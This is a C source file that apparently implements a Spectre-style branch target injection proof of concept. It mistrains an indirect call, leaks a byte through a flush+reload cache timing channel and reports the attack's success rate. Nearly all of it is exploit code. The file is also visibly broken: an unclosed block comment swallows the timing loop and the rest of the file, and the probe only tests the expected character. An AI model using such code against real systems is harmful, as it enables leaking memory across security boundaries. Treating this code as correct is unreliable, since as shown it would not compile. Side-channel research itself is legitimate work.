#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <sched.h>       // For CPU_SET, CPU_ZERO, sched_setaffinity
#ifdef _MSC_VER
#include <intrin.h>
#pragma optimize("gt", on)
#else
#include <x86intrin.h>
#include <sys/syscall.h>
#endif


#define CACHE_HIT_THRESHOLD (200)
#define GAP (1024)
#define TARGET_CHAR 'C'
#define TOTAL_ATTEMPTS 1000


uint8_t channel[256 * GAP];
uint64_t *target;
char *secret = (char[]){TARGET_CHAR};


int gadget(char *addr) {
    return channel[*addr * GAP];
}


int safe_target() {
    return 42;
}


int victim(char *addr, int input) {
    int junk = 0;
        for (int i = 1; i <= 100; i++) {
        input += i;
        junk += input & i;
    }

    int result;
    __asm volatile(
        "callq *%1\n"          
        "mov %%eax, %0\n"      
        : "=r"(result)         
        : "r"(*target)         
        : "rax", "rcx", "rdx", "rsi", "rdi", "r8", "r9", "r10", "r11"  
    );
    return result & junk;
}


int readSingleByte(char *addr_to_read) {
    int hits[256] = {0};  
    int i, j, mix_i, junk = 0;
    uint64_t start, elapsed;
    uint8_t *addr;
    char dummyChar = '$'; 

    
    for (i = 0; i < 256; i++) {
        channel[i * GAP] = 1;
    }

    
    *target = (uint64_t)&gadget;
    _mm_mfence();  
    for (j = 50; j > 0; j--) {
        junk ^= victim(&dummyChar, 0);  
    }
    _mm_mfence();

   pid_t pid = syscall(SYS_getpid); 

    
    for (i = 0; i < 256; i++) {
        _mm_clflush(&channel[i * GAP]);  
    }
    _mm_mfence();

    
    *target = (uint64_t)&safe_target;
    _mm_mfence();
    _mm_clflush((void *)target);  
    _mm_mfence();

    
    junk ^= victim(addr_to_read, 0);
    _mm_mfence();

    
    
    /*for (i = 0; i < 256; i++) {
        mix_i = ((i * 167) + 13) & 255;  
        addr = &channel['C' * GAP];
        start = __rdtsc();              
        junk ^= *addr;                   
        _mm_mfence();                   
        elapsed = __rdtsc() - start;    

        
        if (elapsed <= CACHE_HIT_THRESHOLD) {
            //hits[mix_i]++;
           return 1;
        }
    return 0;
}


int bind_to_cpu(int cpu_core) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);          
    CPU_SET(cpu_core, &cpuset); 
    if (sched_setaffinity(0, sizeof(cpu_set_t), &cpuset) == -1) {
        perror("Failed to set CPU affinity");
        return -1;
    }
    return 0;
}

int main() {
    if (bind_to_cpu(0) != 0) {
        printf("Warning: Failed to bind to CPU core 0. Attack stability may be reduced.\n");
    }

    target = (uint64_t *)malloc(sizeof(uint64_t));
    if (target == NULL) {
        perror("Failed to allocate memory for target");
        return 1;
    }

    int success_count = 0;         
    int predicted_char;             
    char *addr_to_read = secret;    

    printf("=== Detection of BTB invalidation ===\n");
    printf("Target character: '%c' (ASCII: %d)\n", TARGET_CHAR, TARGET_CHAR);
    printf("Total attempts: %d\n", TOTAL_ATTEMPTS);
    printf("----------------------------------------\n");

 
    for (int attempt = 0; attempt < TOTAL_ATTEMPTS; attempt++) {
                success_count+=readSingleByte(addr_to_read);
               if ((attempt + 1) % 100 == 0) {
            printf("Progress: %d/%d attempts completed. Current success rate: %.2f%%\n",
                   attempt + 1, TOTAL_ATTEMPTS,
                   (success_count * 100.0) / (attempt + 1));
        }
    }

      double success_rate = (success_count * 100.0) / TOTAL_ATTEMPTS;
    printf("----------------------------------------\n");
    printf("Attack completed!\n");
    printf("Total attempts: %d\n", TOTAL_ATTEMPTS);
    printf("Successful attempts: %d\n", success_count);
    printf("Success rate: %.2f%%\n", success_rate);
    printf("----------------------------------------\n");
    printf("Note: The target character is '%c' (ASCII: %d).\n", TARGET_CHAR, TARGET_CHAR);
    printf("In each successful attack, the predicted character should be '%c' (ASCII: %d).\n",
           TARGET_CHAR, TARGET_CHAR);

        free(target);
    return 0;
}
